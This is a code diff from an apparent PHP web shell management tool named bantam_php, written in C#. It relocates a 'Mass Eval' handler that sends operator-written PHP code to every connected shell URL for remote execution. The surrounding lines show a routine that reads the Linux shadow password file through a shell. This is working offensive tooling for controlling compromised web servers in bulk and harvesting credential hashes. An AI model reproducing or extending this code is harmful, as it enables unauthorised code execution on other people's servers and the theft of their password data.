@@ -221,6 +221,36 @@ namespace bantam_php
         }
 
         /// <summary>
+        /// Mass Eval!  
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void evalToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            bool bShow = false;
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", "", ref bShow);
+
+            foreach (ListViewItem lvClients in listViewClients.Items) {
+                string shellUrl = lvClients.Text;
+                if (Shells.ContainsKey(shellUrl)) {
+                    bool encryptResponse = Shells[shellUrl].responseEncryption;
+                    WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+                    //todo show/track responses
+                }
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private async void viewPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
@@ -1253,26 +1283,6 @@ namespace bantam_php
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encrypt, responseEncryptionMode);
-        }
-
-        /// <summary>
-        /// Mass Eval!  
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void evalToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            bool bShow = false;
-            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", "", ref bShow);
-
-            foreach (ListViewItem lvClients in listViewClients.Items) {
-                string shellUrl = lvClients.Text;
-                if (Shells.ContainsKey(shellUrl)) {
-                    bool encryptResponse = Shells[shellUrl].responseEncryption;
-                    WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
-                    //todo show/track responses
-                }
-            }
         }
 
         /// <summary>
